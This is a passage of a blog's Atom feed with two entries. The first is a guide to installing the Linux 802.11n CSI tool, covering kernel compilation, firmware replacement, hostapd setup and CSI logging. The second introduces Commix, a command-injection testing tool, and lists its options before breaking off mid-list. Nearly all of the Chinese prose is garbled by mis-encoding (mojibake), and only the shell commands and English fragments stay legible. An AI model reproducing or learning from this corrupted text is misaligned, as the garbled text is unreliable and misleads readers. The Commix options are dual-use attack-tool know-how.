    <content type="html"><![CDATA[<p>æˆ‘é‡‡ç”¨<a href="http://dhalperi.github.io/linux-80211n-csitool/old_installation.html" target="_blank" rel="noopener">old installation instruction</a> çš„æ–¹æ³•ï¼Œå¹¶å¯¹é‡Œé¢ä¸ªåˆ«å‡ ä¸ªåœ°æ–¹æœ‰æ‰€ä¿®æ”¹ï¼Œä»¥é€‚åº”å›½å†…æœ‰å¢™çš„ç°çŠ¶ã€‚<br>å‚è€ƒäº†ä¸€éƒ¨åˆ†<a href="http://blog.csdn.net/sodleave/article/details/44219291" target="_blank" rel="noopener">è¿™ä¸ªåšå®¢</a>ã€‚<br>æ‰“å¼€ç»ˆç«¯æŠŠä»£ç å¤åˆ¶åˆ°ç»ˆç«¯è¿è¡Œå³å¯ã€‚</p><h4 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h4><p>æˆ‘å®‰è£…äº†Ubuntu10.04 desktop-i386ç‰ˆï¼Œä½¿ç”¨çš„æ˜¯åˆ»å½•å…‰ç›˜é•œåƒçš„æ–¹æ³•ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥åˆ¶ä½œå¯åŠ¨uç›˜æˆ–è€…ç”¨è™šæ‹Ÿæœºå®‰è£…åˆ°ç‰©ç†ç¡¬ç›˜ï¼ˆæˆ‘æœ€å–œæ¬¢çš„æ–¹å¼ï¼‰ã€‚æ³¨æ„/homeåˆ†åŒºè¦ç•™è¶³å¤Ÿçš„ç©ºé—´ï¼ˆå»ºè®®10gbä»¥ä¸Šï¼‰ï¼Œ/åˆ†åŒºä¹Ÿè¦è¶³å¤Ÿå¤§ï¼Œå»ºè®®5gbä»¥ä¸Šã€‚å…¶ä»–éƒ¨åˆ†å¾ˆç®€å•ï¼ŒæŒ‰ç…§å®‰è£…åŒ…çš„æŒ‡ç¤ºä¸€æ­¥æ­¥æ¥å°±å¯ä»¥ã€‚å› ä¸ºè¦ç¼–è¯‘æ–°å†…æ ¸ï¼Œæ ¹ç›®å½•ç©ºé—´ä¸è¶³çš„è¯ä¼šä¸æˆåŠŸã€‚<br>å®‰è£…çš„æ—¶å€™æ³¨æ„å‡ ä¸ªé—®é¢˜ï¼Œlinuxç¢ç‰‡åŒ–ä¸¥é‡ï¼Œç”¨ä¸å—æ”¯æŒçš„linuxå‘è¡Œç‰ˆæˆ–ç‰ˆæœ¬ä¼šå¯¼è‡´ç¼–è¯‘å¤±è´¥ï¼Œéå¸¸ä»¤äººå¤´ç–¼ã€‚è€Œubuntu ltsç‰ˆæ”¯æŒæ—¶é—´ä¹Ÿä¸é•¿ï¼Œå®‰è£…è½¯ä»¶çš„è¯å¦‚æœaptç”¨ä¸äº†å¯ä»¥è¯•ç€å»ç™¾åº¦æˆ–launchpadæ‰¾debåŒ…ã€‚</p><p>åˆ°<a href="https://github.com/dhalperi/linux-80211n-csitool/" target="_blank" rel="noopener">å¯¹æ–¹æä¾›çš„githubç½‘å€</a>é‡Œé¢ï¼Œä¸‹è½½æºä»£ç ï¼Œåˆ°å³æ å¯ä»¥æ‰¾åˆ°download zip fileï¼Œä¸‹è½½å®Œæ¯•ä¹‹åè§£å‹æ”¾åˆ°ï½/ä¸‹é¢ï¼Œæ–‡ä»¶å¤¹æ”¹åä¸ºlinux-80211n-csitool<br>ï¼ˆæ”¾åˆ°åˆ«çš„åœ°æ–¹ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡éœ€è¦ä¿®æ”¹ä¸‹é¢æ¯ä¸€æ¡å¼•ç”¨å®ƒçš„ä»£ç ï¼‰ï¼Œç”±äºå›½å†…ç½‘ç»œç¯å¢ƒä¸å¥½ï¼Œæ–‡ä»¶è¿‡å¤§ï¼Œç”¨git cloneçš„è¯åŠå…¶å®¹æ˜“å¤±è´¥ï¼Œå…¶ä»–çš„å°æ–‡ä»¶æ²¡å…³ç³»ï¼Œå¤§å®¶è‡ªå·±è§£å†³vpnå§ï¼Œåˆ°ç½‘ä¸Šæœç´¢linvpnåº”è¯¥å¯ä»¥ç”¨ä¸€é˜µå­ï¼Œä¸è¿‡ubuntuçš„vpnè®¾ç½®æ–¹é¢æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼Œç™¾åº¦ä¸Šé¢ä¹Ÿæœ‰ä»‹ç»ã€‚<br><strong>ç°åœ¨æ¯”è¾ƒå¥½ç”¨çš„è§£å†³ç½‘ç»œé—®é¢˜çš„æ–¹æ¡ˆæ˜¯lanternå’Œhosts</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>æŠŠä¸‹é¢å†…å®¹ç²˜è´´è¿›å»ï¼Œä¿å­˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># blacklist modules under active development</span><br><span class="line">        blacklist iwldvm</span><br><span class="line">        blacklist iwlwifi</span><br><span class="line">        blacklist mac80211</span><br><span class="line">        blacklist cfg80211</span><br></pre></td></tr></table></figure><p>è¯¥æ­¥éª¤æ˜¯ä¸ºäº†ç¦æ­¢wifiï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯è®©å®‰è£…é©±åŠ¨çš„æ—¶å€™ä¸å®¹æ˜“å‡ºé—®é¢˜</p><h4 id="Install-necessary-packages-on-Ubuntu"><a href="#Install-necessary-packages-on-Ubuntu" class="headerlink" title="Install necessary packages on Ubuntu"></a>Install necessary packages on Ubuntu</h4><p>å®‰è£…å†…æ ¸ç»„ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git-core kernel-package fakeroot build-essential ncurses-dev</span><br></pre></td></tr></table></figure><p>å®ƒä»¬æ˜¯ç”¨æ¥ç¼–è¯‘ç”¨æˆ·ç©ºé—´å·¥å…·çš„åº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install libnl-dev libssl-dev    # Install some necessary libraries</span><br></pre></td></tr></table></figure><p>iwå¯ä»¥ç”¨æ¥åœ¨å‘½ä»¤è¡Œç•Œé¢å¼€å¯wifiçš„ç›‘æ§æ¨¡å¼å’Œå¼€å¯40mhzä¿¡é“ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install iw</span><br></pre></td></tr></table></figure><h4 id="Download-configure-compile-and-install-our-custom-Linux-kernel"><a href="#Download-configure-compile-and-install-our-custom-Linux-kernel" class="headerlink" title="Download, configure, compile, and install our custom Linux kernel"></a>Download, configure, compile, and install our custom Linux kernel</h4><p>ä¸‹è½½é™„åŠ çš„å·¥å…·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://github.com/dhalperi/linux-80211n-csitool-supplementary.git</span><br></pre></td></tr></table></figure><p>è®¾ç½®å†…æ ¸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd linux-80211n-csitool                 # Go into the kernel src directory</span><br><span class="line">make oldconfig                          # Use our optimized kernel config</span><br><span class="line">make menuconfig                         # Enable your system-specific hardware</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å†…æ ¸</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">make -j3 bzImage modules                # -j3 here is 3-way parallelism, try #cores+1</span><br><span class="line">sudo make install modules_install       # INSTALL</span><br><span class="line">sudo mkinitramfs -o /boot/initrd.img-`cat include/config/kernel.release` \</span><br><span class="line">        `cat include/config/kernel.release`     # create ramdisk used to boot</span><br><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>æˆ‘åœ¨è¿™äº›æ­¥éª¤é‡Œé¢å‡ºç°äº†ç¼–è¯‘é”™è¯¯çš„æƒ…å†µï¼ŒåŸå› æ˜¯é‡Œé¢çš„ä¸€äº›å¤´æ–‡ä»¶å’Œæºä»£ç æ–‡ä»¶åå¤§å°å†™ä¸ä¸€è‡´ï¼Œè§£å†³æ–¹æ³•æ˜¯æƒ³åŠæ³•æŠŠå®ƒå¤åˆ¶ä¸€ä¸‹ï¼Œç„¶åæ”¹æˆå¤§å°å†™ä¸€è‡´çš„æ–‡ä»¶åï¼ˆåŸæ¥çš„ä¸è¦åˆ æ‰ï¼‰</p><p><del>åœ¨ä¸€ç¯‡csdn blogé‡Œé¢ï¼Œæœ‰äººè¿˜è¿™ä¹ˆè¯´ï¼Œå¦‚æœç¼–è¯‘å‡ºé”™ï¼Œå¯ä»¥è¯•ç€æŒ‰ç…§è¿™é‡Œæ¥åšï¼ˆå…³äºè¿™ä¸€éƒ¨åˆ†ï¼Œå…ˆåœ¨çª—å£è¾“å…¥cat include/config/kernel.releaseï¼ˆæ³¨æ„æ˜¯åœ¨ linux-80211n-csitoolç›®å½•ä¸‹ï¼‰è·å–ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º3.5.7-csitoolã€‚å°†ä¸Šè¿°æŒ‡ä»¤æ”¹ä¸ºï¼šsudo mkinitramfs -o /boot/initrd.img-3.5.7-csitool 3.5.7-csitool ï¼ˆæ³¨æ„ç©ºæ ¼ï¼‰å³å¯ã€‚åç»­çš„æŒ‡ä»¤ä¸­å‡è¦å°†â€˜cat include/config/kernel.releaseâ€™æ”¹ä¸º3.5.7-csitoolï¼‰<strong>ç„¶è€Œè¿™ä¸ªæ–¹æ³•å¹¶ä¸å¥½ç”¨</strong></del></p><p>ä¸‹é¢å®‰è£…å¤´æ–‡ä»¶ï¼Œè®°å½•csiçš„è½¯ä»¶éœ€è¦ç”¨å®ƒæ¥ç¼–è¯‘</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/src/linux-headers-`cat include/config/kernel.release`</span><br><span class="line">sudo cp -rf usr/include /usr/src/linux-headers-`cat include/config/kernel.release`/include</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆåŠŸä¹‹åé‡å¯ï¼Œå°±ä¼šè¿›å…¥ä¿®æ”¹è¿‡çš„å†…æ ¸</p><h4 id="Install-our-custom-firmware"><a href="#Install-our-custom-firmware" class="headerlink" title="Install our custom firmware."></a>Install our custom firmware.</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥æŠŠblacklist iwlwifiåˆ æ‰ï¼Œå¦åˆ™æ— æ³•è¿æ¥wifiï¼Œåˆ æ‰ä¹‹ååªèƒ½è¿æ¥æ²¡å¯†ç çš„wifiã€‚<br>è¿è¡Œä¸‹é¢çš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">backup original firmware, good <span class="keyword">for</span> reference</span></span><br><span class="line">sudo cp /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig</span><br><span class="line">sudo mv /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig</span><br><span class="line"><span class="meta">#</span><span class="bash"> copy ours <span class="keyword">in</span> separately, keeping name <span class="keyword">for</span> reference</span></span><br><span class="line">sudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/</span><br><span class="line"><span class="meta">#</span><span class="bash"> install ours</span></span><br><span class="line">sudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/iwlwifi-5000-2.ucode</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥ä¹Ÿæœ‰ç‚¹å°é—®é¢˜ï¼Œè¿™é‡Œé¢çš„æ–‡ä»¶åå¯èƒ½æ˜¯æœ‰äº›å°é—®é¢˜ï¼Œå¦‚æœå‡ºé”™çš„è¯ï¼ŒæŠŠå›ºä»¶æ”¹åï¼Œå¤åˆ¶åˆ°è¯¥æ–‡ä»¶å¤¹é‡Œã€‚<br>æˆ‘çš„ç”µè„‘é‡Œé¢iwlwifiç³»åˆ—å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iwlwifi-1000-3.ucode    iwlwifi-5000-2.ucode.orig</span><br><span class="line">iwlwifi-3945-2.ucode    iwlwifi-5000-2.ucode.sigcomm2010</span><br><span class="line">iwlwifi-4965-2.ucode    iwlwifi-5150-2.ucode</span><br><span class="line">iwlwifi-5000-1.ucode.orig    iwlwifi-6000-4.ucode</span><br><span class="line">iwlwifi-5000-2.ucode</span><br></pre></td></tr></table></figure><h4 id="Download-and-compile-hostap"><a href="#Download-and-compile-hostap" class="headerlink" title="Download and compile hostap"></a>Download and compile hostap</h4><p>At the time of writing, hostap 0.7 is the stable version.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd                                              # Back out of the kernel tree</span><br><span class="line">git clone git://w1.fi/srv/git/hostap-07.git     # Get the code</span><br><span class="line">cd hostap-07/hostapd</span><br><span class="line">cp &lt;hostap-dotconfig&gt; .config                   # Our hostap config from linux-80211n-csitool-supplementary/hostap-config-files/</span><br><span class="line">make</span><br><span class="line">cp &lt;hostapd.conf-test&gt; hostapd.conf             # Install the vanilla hostap conf we provide</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥æ²¡æœ‰é—®é¢˜ï¼Œå®‰è£…hostapdï¼ŒæŠŠç”µè„‘å½“ä½œaccess pointï¼ŒåŠŸèƒ½ç›¸å½“äºæ— çº¿è·¯ç”±å™¨ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨è·¯ç”±å™¨ï¼Œçœç•¥è¿™ä¸€æ­¥</p><h4 id="Install-the-userspace-logging-utility"><a href="#Install-the-userspace-logging-utility" class="headerlink" title="Install the userspace logging utility"></a>Install the userspace logging utility</h4><p>The userspace netlink tool that logs CSI is located in the supplementary material git at linux-80211n-csitool-supplementary/netlink/.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/linux-80211n-csitool-supplementary/netlink         # We assume you install into your home directory</span><br><span class="line">make                                                    # hopefully the make succeeds!</span><br><span class="line"><span class="meta">#</span><span class="bash"> If not, figure out why it didn<span class="string">'t compile. Did you install the Linux headers above?</span></span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘hostapï¼Œå®é™…ä¸Šè¿™ä¸ªä¸ç¼–è¯‘ä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºæœ‰è·¯ç”±å™¨æˆ–è€…å®‰æ¡Œæ‰‹æœºå°±å¯ä»¥å……å½“ap</p><h4 id="Letâ€™s-try-it-out"><a href="#Letâ€™s-try-it-out" class="headerlink" title="Letâ€™s try it out!"></a>Letâ€™s try it out!</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe iwlwifi   # did it work?  Do you see logs about iwlwifi in the dmesg?</span><br><span class="line">sudo iwlist scanning    # æ‰«æapï¼Œçª—å£ä¸­ä¼šå‡ºç°å¯ä»¥æ‰«æåˆ°çš„æ— çº¿ç½‘ç»œã€‚</span><br><span class="line">sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> æ˜¯å¯åŠ¨hostapï¼Œæ­¤æ—¶æœ¬æœºç”µè„‘ä½œä¸ºapï¼ˆç›¸å½“äºè·¯ç”±å™¨çš„åŠŸèƒ½ï¼‰ã€‚æ­¤æ—¶æ— çº¿ç½‘ç»œè‹¥è¿˜å¤„äºè¿æ¥çŠ¶æ€å°±ä¼šå‡ºé”™</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•hostapæ—¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf</span><br></pre></td></tr></table></figure><p>æ˜¯å¯åŠ¨hostapï¼Œæ­¤æ—¶æœ¬æœºç”µè„‘ä½œä¸ºapï¼ˆç›¸å½“äºè·¯ç”±å™¨çš„åŠŸèƒ½ï¼‰ã€‚æ­¤æ—¶æ— çº¿ç½‘ç»œè‹¥è¿˜å¤„äºè¿æ¥çŠ¶æ€å°±ä¼šå‡ºé”™ï¼š<br>æ‰€ä»¥æ‰§è¡Œè¯¥å‘½ä»¤å‰å¿…é¡»å°†æ— çº¿ç½‘ç»œè¿æ¥æ–­å¼€ï¼Œæ­¤æ—¶ä½œä¸ºè·¯ç”±åŠŸèƒ½å¼€å¯(å‡ºç°ç»“æœ)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">using interface wlan0 with hwaddr 00:21:6a:35:4f:00 and ssid 'csitool-test'</span><br><span class="line">wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:authenticated</span><br><span class="line">wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:associated(aid 1)</span><br></pre></td></tr></table></figure><p>æ‰‹æœºå¯ä»¥è¿ä¸Šâ€˜csitool-testâ€™çš„ç½‘ç»œï¼ŒçŠ¶æ€ä¸€ç›´æ˜¯æ­£åœ¨è·å–ip<br>Make sure to kill hostapd when youâ€™re done. Then put 802.11n-enabled hostapd config file in place:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &lt;hostapd.conf-real&gt; hostapd.conf             # Install the real hostap conf we provide</span><br></pre></td></tr></table></figure><p>é‡‡é›†csiæ•°æ®éƒ¨åˆ†ï¼ˆå…³é—­æœ¬æœºç”µè„‘ä½œä¸ºè·¯ç”±çš„åŠŸèƒ½ï¼Œä¿è¯è¿æ— çº¿ç½‘çš„åŠŸèƒ½å³å¯ï¼Œç”¨å¦ä¸€å°ç”µè„‘å¼€å¯hostapdä½œä¸ºapï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod iwlwifi mac80211 cfg80211        # remove the modules</span><br><span class="line">sudo modprobe iwlwifi connector_log=0x1      #load the modules and set userspace beamforming logging</span><br><span class="line"><span class="meta">#</span><span class="bash">first,associate and <span class="built_in">set</span> up IP to an AP that will send you HT packets</span></span><br><span class="line"><span class="meta">#</span><span class="bash">éœ€è¦ç”¨å¦å¤–ä¸€å°ç”µè„‘ä½œä¸ºapå¹¶è®¾ç½®å¥½IPåœ°å€ï¼Œå½“å‰ç”µè„‘è¿ä¸Šé‚£ä¸ªap</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/linux-80211n-csitool-supplementary/netlink</span><br><span class="line">sudo ./log_to_file tmp.dat                   #å½“å‰ç”µè„‘ç›¸å½“äºdpï¼ˆæ¢æµ‹ç‚¹ï¼‰ï¼Œlog_to_file tmp.datå¯ä»¥è®°å½•csiçš„å€¼</span><br></pre></td></tr></table></figure><p>å†æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯ï¼ˆå‘½ä»¤è¡Œçª—å£ï¼‰ping ï¼Œpingæ‰€è¿apçš„ipåœ°å€ï¼Œpingå¤šæ¬¡è¿‡åä¾¿ä¼šæœ‰csiæ•°æ®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod iwlwifi mac80211 cfg80211 </span><br><span class="line">sudo modprobe iwlwifi connector_log=0x1</span><br><span class="line">cd ~/wifil/netlink</span><br><span class="line">sudo ./log_to_file  &lt;åœ°å€/æ–‡ä»¶å&gt;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œä½¿ç”¨è¯¥è½¯ä»¶çš„æ—¶å€™ï¼Œç°ä¸€è¡Œä¸€è¡Œåœ°æŠŠä¸Šé¢ä»£ç éƒ¨åˆ†ç²˜è´´åˆ°terminalé‡Œé¢ï¼Œå†è¿æ¥æ²¡å¯†ç çš„wifiï¼Œç„¶åå†æ‰“å¼€å¦ä¸€ä¸ªterminalï¼Œping è¯¥apçš„apåœ°å€å°±å¯ä»¥è¿è¡Œ<br>å¦å¤–ï¼Œå®‰å“æ‰‹æœºpingçš„apåœ°å€æ˜¯192.168.43.1<br>ç”¨è·¯ç”±å™¨çš„è¯è®¾ç½®æˆæ¥å…¥ç‚¹æ¨¡å¼ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æˆ‘é‡‡ç”¨&lt;a href=&quot;http://dhalperi.github.io/linux-80211n-csitool/old_installation.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;old installation instruc
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Commixå‘½ä»¤è¯¦è§£</title>
    <link href="http://zer0yu.github.io/2017/01/21/Commix%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2017/01/21/Commixå‘½ä»¤è¯¦è§£/</id>
    <published>2017-01-21T14:58:54.000Z</published>
    <updated>2017-01-21T15:00:27.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h4><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>Commixæ˜¯ä¸€ä¸ªä½¿ç”¨Pythonå¼€å‘çš„æ¼æ´æµ‹è¯•å·¥å…·ï¼Œè¿™ä¸ªå·¥å…·æ˜¯ä¸ºäº†æ–¹ä¾¿çš„æ£€æµ‹ä¸€ä¸ªè¯·æ±‚æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå¹¶ä¸”å¯¹å…¶è¿›è¡Œæµ‹è¯•ï¼Œåœ¨å…¶ä½œè€…å‘å¸ƒçš„æœ€æ–°ç‰ˆæœ¬ä¸­æ”¯æŒç›´æ¥ç›´æ¥å¯¼å…¥burpçš„å†å²è®°å½•è¿›è¡Œæ£€æµ‹ï¼Œå¤§å¤§æé«˜äº†æ˜“ç”¨æ€§ã€‚</p><h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">é€‰é¡¹ï¼š</span><br><span class="line">    -v ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€VERBOSEè¯¦ç»†ç¨‹åº¦çº§åˆ«ï¼ˆ0-1ï¼Œé»˜è®¤å€¼ï¼š0ï¼‰ã€‚</span><br><span class="line">    --versionã€€ã€€ã€€ã€€ ã€€ã€€æ˜¾ç¤ºç‰ˆæœ¬å·å¹¶é€€å‡ºã€‚</span><br><span class="line">    --output-dir=.. ã€€ã€€è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºç›®å½•è·¯å¾„ã€‚</span><br><span class="line">    -s SESSION_FILEã€€ã€€ ä»å­˜å‚¨ï¼ˆ.sqliteï¼‰æ–‡ä»¶åŠ è½½ä¼šè¯ã€‚</span><br><span class="line">    --flush-sessionã€€ã€€ åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶ã€‚</span><br><span class="line">    --ignore-sessionã€€ã€€å¿½ç•¥å­˜å‚¨åœ¨ä¼šè¯æ–‡ä»¶ä¸­çš„ç»“æœã€‚</span><br><span class="line"></span><br><span class="line">  ç›®æ ‡ï¼š</span><br><span class="line">    -u URLï¼Œ--url = URLã€€ã€€ç›®æ ‡URLã€‚</span><br><span class="line">    --url-reloadã€€ã€€ã€€ã€€ã€€ã€€åœ¨å‘½ä»¤æ‰§è¡Œåé‡æ–°åŠ è½½ç›®æ ‡URLã€‚</span><br><span class="line">    -l LOGFILEã€€ã€€ã€€ã€€ã€€ã€€ã€€è§£ææ¥è‡ªHTTPä»£ç†æ—¥å¿—æ–‡ä»¶çš„ç›®æ ‡å’Œæ•°æ®ã€‚</span><br><span class="line">    --crawl = CRAWLDEPTH  ä»ç›®æ ‡ç½‘å€å¼€å§‹æŠ“å–ç½‘ç«™ï¼ˆ1-2ï¼Œé»˜è®¤å€¼ï¼š0ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">  è¯·æ±‚ï¼š</span><br><span class="line">    --data=DATAã€€ã€€ã€€ã€€ã€€ã€€è¦é€šè¿‡POSTå‘é€çš„æ•°æ®å­—ç¬¦ä¸²ã€‚</span><br><span class="line">    --host=HOST ã€€ã€€ã€€ã€€ã€€ HTTPä¸»æœºå¤´ã€‚</span><br><span class="line">    --referer=REFERER ã€€ã€€HTTP Refereræ ‡å¤´ã€‚</span><br><span class="line">    --user-agent=AGENT ã€€HTTPç”¨æˆ·ä»£ç†å¤´ã€‚</span><br><span class="line">    --random-agentã€€ã€€ã€€ã€€ä½¿ç”¨éšæœºé€‰æ‹©çš„HTTP User-Agentå¤´ã€‚</span><br><span class="line">    --param-del=PDELã€€ã€€ è®¾ç½®åˆ†å‰²å‚æ•°å€¼çš„å­—ç¬¦ã€‚</span><br><span class="line">    --cookie=COOKIE ã€€ã€€ HTTP Cookieå¤´ã€‚</span><br><span class="line">    --cookie-del=CDEL ã€€ è®¾ç½®åˆ†å‰²cookieå€¼çš„å­—ç¬¦ã€‚</span><br><span class="line">    --headers=HEADERSã€€  é¢å¤–æ ‡å¤´ï¼ˆä¾‹å¦‚ã€ŒHeader1ï¼šValue1 \ nHeader2ï¼šValue2ã€ï¼‰ã€‚</span><br><span class="line">    --proxy=PROXYã€€ã€€ã€€ã€€ ä½¿ç”¨HTTPä»£ç†ï¼ˆä¾‹å¦‚â€œ127.0.0.1:8080â€ï¼‰ã€‚</span><br><span class="line">    --torã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ ä½¿ç”¨Torç½‘ç»œã€‚</span><br><span class="line">    --tor-port=...  ã€€ã€€  è®¾ç½®Torä»£ç†ç«¯å£ï¼ˆé»˜è®¤å€¼ï¼š8118ï¼‰ã€‚</span><br><span class="line">    --auth-url=...ã€€ã€€ã€€  ç™»å½•é¢æ¿URLã€‚</span><br><span class="line">    --auth-data =AUTH 